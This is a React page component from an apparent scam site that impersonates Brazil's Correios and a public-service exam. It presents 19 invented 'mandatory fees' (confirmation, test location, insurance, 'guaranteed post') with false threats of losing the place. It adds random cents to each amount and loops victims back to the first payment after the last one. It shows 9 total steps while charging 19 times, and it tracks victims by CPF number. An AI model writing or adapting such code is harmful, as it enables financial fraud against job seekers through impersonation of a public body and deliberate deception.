import { useEffect, useMemo } from "react";
import { useNavigate, useLocation, useParams } from "react-router-dom";
import CorreiosHeader from "@/components/CorreiosHeader";
import CorreiosFooter from "@/components/CorreiosFooter";
import UpsellStep from "@/components/UpsellStep";
import { CPFData } from "@/lib/cpf";
import { getSession, saveSession } from "@/hooks/useSessionPersistence";

import { trackFunnelEvent } from "@/hooks/useFunnelTracking";

const UPSELLS = [
  { valor: 47, title: "Confirmação da Inscrição", description: "Sua inscrição precisa ser confirmada. O pagamento desta taxa é obrigatório para garantir sua vaga no concurso." },
  { valor: 37, title: "Confirmação do Local da Prova", description: "O pagamento desta taxa é obrigatório para confirmar o local de prova mais próximo de você." },
  { valor: 39, title: "Cartão de Acesso à Prova", description: "O pagamento desta taxa é obrigatório. Sem o cartão de acesso, você não entra na sala de prova." },
  { valor: 27, title: "Seguro do Candidato", description: "Taxa obrigatória de proteção. Se o concurso for cancelado, você recebe todo o dinheiro de volta." },
  { valor: 33, title: "Apostila Digital Oficial", description: "Taxa obrigatória. Material completo com todo o conteúdo que cai na prova, elaborado pela banca." },
  { valor: 24, title: "Simulado Online da Banca", description: "Taxa obrigatória. Simulado no mesmo formato da prova real para você se preparar adequadamente." },
  { valor: 19, title: "Certificado de Pré-Aprovação", description: "Taxa obrigatória. Documento que comprova que você cumpriu todos os requisitos do edital." },
  { valor: 15, title: "Acompanhamento por SMS e E-mail", description: "Taxa obrigatória. Receba todas as atualizações sobre datas, locais e resultados do concurso." },
  { valor: 97, title: "Garantia de Vaga na Região", description: "Taxa obrigatória — última etapa. Garante que se aprovado, você trabalha na agência mais perto da sua casa." },
  { valor: 29, title: "Kit Documentos para Posse", description: "Taxa obrigatória. Todos os documentos necessários para tomar posse. Sem eles, você perde a vaga." },
  { valor: 57, title: "Curso Preparatório Express", description: "Taxa obrigatória. Curso intensivo de 7 dias focado no que cai na prova." },
  { valor: 22, title: "Recurso Administrativo", description: "Taxa obrigatória. Modelos de recurso prontos e orientação jurídica para contestar irregularidades." },
  { valor: 17, title: "Atualização do Edital", description: "Taxa obrigatória. Receba imediatamente qualquer mudança no edital — datas, conteúdos e vagas." },
  { valor: 31, title: "Prioridade na Correção", description: "Taxa obrigatória. Sua prova corrigida em até 48h — resultado antes de todo mundo." },
  { valor: 23, title: "Certificado de Conclusão de Curso", description: "Taxa obrigatória. Validação do certificado escolar, exigido para a posse no cargo." },
  { valor: 14, title: "Acesso ao Grupo VIP", description: "Taxa obrigatória. Grupo exclusivo com dicas, macetes e troca de experiências entre candidatos." },
  { valor: 18, title: "Seguro Contra Atraso", description: "Taxa obrigatória. Se não conseguir chegar na prova por imprevisto, recebe reembolso integral." },
  { valor: 43, title: "Consultoria Individual", description: "Taxa obrigatória. Orientação personalizada de um especialista com plano de estudo sob medida." },
  { valor: 67, title: "Pacote de Posse Garantida", description: "Taxa obrigatória — última. Pacote completo: documentação, exames e orientação jurídica para a posse." },
];

const Upsell = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const { step } = useParams<{ step: string }>();

  const parsedStep = parseInt(step || "1", 10);
  const stepNumber = isNaN(parsedStep) ? 1 : Math.min(Math.max(parsedStep, 1), 19);
  const currentIndex = stepNumber - 1;
  const currentUpsell = UPSELLS[currentIndex];

  const valorComCentavos = useMemo(() => currentUpsell.valor + (Math.floor(Math.random() * 99) + 1) / 100, [stepNumber]);

  const session = getSession();
  const cpfData: CPFData | undefined = location.state?.cpfData || session?.cpfData;
  const valorBeneficio: number | undefined = location.state?.valorBeneficio || session?.valorBeneficio;
  const protocolo: string | undefined = location.state?.protocolo || session?.protocolo;

  useEffect(() => { window.scrollTo(0, 0); }, [stepNumber]);

  useEffect(() => {
    if (!cpfData) { navigate("/"); return; }
    saveSession({ cpfData, currentStep: `/upsell/${stepNumber}`, valorBeneficio, protocolo });
    trackFunnelEvent(`upsell-${stepNumber}`, { cpf: cpfData.cpf });
  }, [cpfData, valorBeneficio, protocolo, navigate, stepNumber]);

  const handlePaymentConfirmed = () => {
    const stateData = { cpfData, valorBeneficio, protocolo };
    if (stepNumber < 19) {
      navigate(`/upsell/${stepNumber + 1}`, { state: stateData });
    } else {
      navigate("/upsell/1", { state: stateData });
    }
  };

  if (!cpfData) return null;

  return (
    <div className="min-h-screen flex flex-col bg-background">
      <CorreiosHeader breadcrumb="Concursos > Agente Comercial > Taxas Opcionais" />

      <main className="flex-1 flex items-center justify-center px-4 py-6 sm:py-8">
        <UpsellStep
          key={stepNumber}
          title={currentUpsell.title}
          description={currentUpsell.description}
          valor={valorComCentavos}
          cpfData={cpfData}
          protocolo={protocolo || `BB${Date.now()}`}
          onPaymentConfirmed={handlePaymentConfirmed}
          stepNumber={stepNumber}
          totalSteps={9}
        />
      </main>

      <CorreiosFooter />
    </div>
  );
};

export default Upsell;
